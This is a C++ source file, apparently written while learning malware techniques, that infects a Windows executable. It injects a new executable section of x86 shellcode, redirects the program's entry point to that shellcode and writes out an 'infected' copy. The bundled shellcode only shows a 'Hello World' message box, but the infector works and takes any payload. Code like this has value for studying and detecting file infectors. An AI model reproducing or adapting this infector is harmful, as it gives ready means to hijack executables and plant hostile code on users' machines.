
#include <iostream>
#include <Windows.h>
#pragma warning(disable : 4996) //close warning

char MessageBox_HelloWorld[] =
"\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"
    "\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"
    "\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"
    "\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"
    "\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"
    "\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"
    "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"
    "\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"
    "\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"
    "\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"
    "\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"
    "\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"
    "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"
    "\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"
    "\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"
    "\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"
    "\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"
    "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"
    "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"
    "\x69\x74\x54\x53\xff\xd6\x57\xff\xd0";

bool readBinFile(const char fileName[], char** bufPtr, DWORD& length) {
	if (FILE* fp = fopen(fileName, "rb")) {
		fseek(fp, 0, SEEK_END);
		length = ftell(fp);
		*bufPtr = new char[length + 1];
		fseek(fp, 0, SEEK_SET);
		fread(*bufPtr, sizeof(char), length, fp);
		return true;
	}
	return false;
}

int main(int argc, char** argv) {
	if (argc != 2) {
		puts("[!] usage: ./PEShellcode.exe [path/to/file]");
		return 0;
	}

	char* buff; DWORD fileSize;
	if (!readBinFile(argv[1], &buff, fileSize)) {
		puts("[!] selected file not found.");
		return 0;
	}

#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew))
#define getSectionArr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))

	puts("[+] malloc memory for outputed *.exe file.");
	size_t sectAlign = getNtHdr(buff)->OptionalHeader.SectionAlignment,
		fileAlign = getNtHdr(buff)->OptionalHeader.FileAlignment,
		finalOutSize = fileSize + P2ALIGNUP(sizeof(MessageBox_HelloWorld), fileAlign);
	char* outBuf = (char*)malloc(finalOutSize);
	memcpy(outBuf, buff, fileSize);

	puts("[+] create a new section to store shellcode.");
	auto sectArr = getSectionArr(outBuf);
	PIMAGE_SECTION_HEADER lastestSecHdr = &sectArr[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1];
	PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + 1;
	memcpy(newSectionHdr->Name, "CindyLearnMalware", 8);
	newSectionHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(MessageBox_HelloWorld), sectAlign);
	newSectionHdr->VirtualAddress = P2ALIGNUP((lastestSecHdr->VirtualAddress + lastestSecHdr->Misc.VirtualSize), sectAlign);
	newSectionHdr->SizeOfRawData = sizeof(MessageBox_HelloWorld);
	newSectionHdr->PointerToRawData = lastestSecHdr->PointerToRawData + lastestSecHdr->SizeOfRawData;
	newSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
	getNtHdr(outBuf)->FileHeader.NumberOfSections += 1;

	puts("[+] pack x86 shellcode into new section.");
	memcpy(outBuf + newSectionHdr->PointerToRawData, MessageBox_HelloWorld, sizeof(MessageBox_HelloWorld));

	puts("[+] repair virtual size. (consider *.exe built by old compiler)");
	for (size_t i = 1; i < getNtHdr(outBuf)->FileHeader.NumberOfSections; i++)
		sectArr[i - 1].Misc.VirtualSize = sectArr[i].VirtualAddress - sectArr[i - 1].VirtualAddress;

	puts("[+] fix image size in memory.");
	getNtHdr(outBuf)->OptionalHeader.SizeOfImage =
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].VirtualAddress +
		getSectionArr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections - 1].Misc.VirtualSize;

	puts("[+] point EP to shellcode.");
	getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint = newSectionHdr->VirtualAddress;

	char outputPath[MAX_PATH];
	memcpy(outputPath, argv[1], sizeof(outputPath));
	strcpy(strrchr(outputPath, '.'), "infectedShellCode.exe");
	FILE* fp = fopen(outputPath, "wb");
	fwrite(outBuf, 1, finalOutSize, fp);
	fclose(fp);

	printf("[+] file saved at %s\n", outputPath);
	puts("[+] done.");
	return 0;
}
